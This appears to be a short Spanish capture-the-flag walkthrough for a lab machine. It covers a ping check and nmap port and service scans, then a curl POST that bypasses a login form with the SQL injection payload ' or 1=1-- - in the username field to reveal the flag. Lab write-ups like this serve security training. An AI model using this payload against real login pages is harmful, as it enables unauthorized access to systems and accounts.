🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.139.189

PING 10.129.139.189 (10.129.139.189) 56(84) bytes of data.
64 bytes from 10.129.139.189: icmp_seq=1 ttl=63 time=1796 ms

--- 10.129.139.189 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1796.385/1796.385/1796.385/0.000 ms
```

> Sistema operativo:  **Linux**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vv 10.129.139.189 -oG openPorts

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 80 -sCV 10.129.139.189 -oN targeted

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login
```

🗹 Realizar una petición POST con `curl` modificando el campo `username`:

```shell
curl -s -X POST http://10.129.139.189 -d "username=' or 1=1-- -&password=password"
```
## Flag

La flag se visualiza en la respuesta a la petición POST.